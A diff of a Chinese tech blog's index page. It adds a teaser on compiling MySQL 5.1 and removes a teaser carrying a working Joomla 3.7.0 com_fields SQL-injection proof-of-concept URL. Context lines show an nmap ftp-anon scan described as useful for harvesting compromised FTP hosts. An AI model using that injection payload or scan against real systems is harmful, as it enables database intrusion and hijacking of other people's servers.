@@ -139,6 +139,38 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/06/27/mysql51-compile/">
+                极速编译安装 mysql 5.1
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-06-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/env/">env</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>00x1 创建 mysql 服务用户:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> groupadd mysql</span></div><div class="line"><span class="meta">#</span><span class="bash"> useradd mysql -s /sbin/nologin -M -g mysql</span></div></pre></td></tr></table></figure></p>
+<p>00x2 下载编译安装 mysql5.1:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install ncurses-devel -y 	mysql需要此库的支持</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget http://sources.openelec.tv/mirror/mysql/mysql-5.1.68.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf mysql-5.1.68.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> mysql-5.1.68</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/06/27/mysql51-compile/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/06/26/php-5-5-38/">
                 极速部署 php5.5.38
             </a>
@@ -356,38 +388,6 @@
 <p>ftp相关的一些漏洞检测脚本:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span>	检查目标<span class="selector-tag">ftp</span>是否允许匿名登录,光能登陆还不够,它会自动检测目录是否可读写,批量抓<span class="selector-tag">ftp</span>肉鸡,可用</div><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-p</span> 21 <span class="selector-tag">--script</span> <span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/05/18/nmap-script/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
-                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/joomla-exp/">joomla exp</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
-<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
-        </div>
-        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
     
 
 </div>
